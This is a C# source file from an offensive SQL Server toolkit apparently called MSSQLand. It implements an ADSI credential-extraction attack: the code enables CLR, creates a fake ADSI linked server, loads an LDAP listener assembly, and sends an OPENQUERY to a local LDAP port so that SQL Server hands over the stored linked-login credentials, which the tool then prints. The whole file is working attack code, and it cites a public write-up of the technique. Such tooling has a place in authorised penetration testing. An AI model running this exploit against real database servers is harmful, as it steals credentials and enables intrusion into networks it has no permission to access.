using MSSQLand.Services;
using MSSQLand.Utilities;
using System;
using System.Data;
using System.Threading.Tasks;

namespace MSSQLand.Actions.Network
{
    /// <summary>
    /// https://www.tarlogic.com/blog/linked-servers-adsi-passwords
    /// </summary>
    internal class AdsiCredentialExtractor : BaseAction
    {


        private int _port;

        public override void ValidateArguments(string additionalArguments)
        {
            if (string.IsNullOrWhiteSpace(additionalArguments))
            {
                _port = Misc.GetRandomUnusedPort();
            }
            else if (!int.TryParse(additionalArguments.Trim(), out _port) || _port < 1 || _port > 65535)
            {
                throw new ArgumentException("The port must be a valid integer between 1 and 65535.");
            }

        }



        /// <summary>
        /// Executes the PowerShell command to download and run the script from the provided URL.
        /// </summary>
        /// <param name="databaseContext">The ConnectionManager instance to execute the query.</param>
        public override void Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested($"Extracting credentials using Active Directory Service Interfaces (ADSI) provider");

            if (databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1) == false)
            {
                Logger.Error("Failed to enable CLR. Aborting execution.");
                return;
            }

            AdsiService adsiService = new(databaseContext)
            {
                Port = _port
            };

            string fakeAdsiServer = $"SQL-{Guid.NewGuid().ToString("N").Substring(0, 4)}";

            if (!adsiService.CreateAdsiLinkedServer(fakeAdsiServer))
            {
                adsiService.DropLinkedServer(fakeAdsiServer);
                if (!adsiService.CreateAdsiLinkedServer(fakeAdsiServer))
                {
                    return;
                }
            }

            try {
                adsiService.LoadLdapServerAssembly();

                Task<DataTable> task = adsiService.ListenForRequest();

                Logger.TaskNested("Executing LDAP solicitation");

                string impersonateTarget = databaseContext.Server.ImpersonationUser;

                string exploitQuery = $"SELECT * FROM OPENQUERY([{fakeAdsiServer}], 'SELECT * FROM ''LDAP://localhost:{adsiService.Port}'' ');";

                if (!string.IsNullOrEmpty(impersonateTarget))
                {
                    Logger.Warning("You cannot retrieve impersonated user credential since it is not mapped to your fake ADSI server");
                    exploitQuery = $"REVERT; {exploitQuery}";
                }

                try
                {
                    databaseContext.QueryService.Execute(exploitQuery);
                } catch
                {
                    // Ignore the exception, it is normal to fail since the ADSI server is not real
                }


                // Wait for the background task to complete and get the result
                DataTable ldapResult = task.Result;

                // Display only the first row of the result
                if (ldapResult != null && ldapResult.Rows.Count > 0)
                {
                    DataRow firstRow = ldapResult.Rows[0];
                    Logger.Success("Credentials retrieved");
                    Logger.NewLine();
                    Console.WriteLine(firstRow[0].ToString());
                }
                else
                {
                    Console.WriteLine("No results found");
                }
            }
            catch (Exception ex)
            {
                Logger.Error($"Error occurred during the ADSI credentials retrieval exploit: {ex.Message}");
            }
            finally
            {
                adsiService.DropLinkedServer(fakeAdsiServer);
            }
        }
    }
}
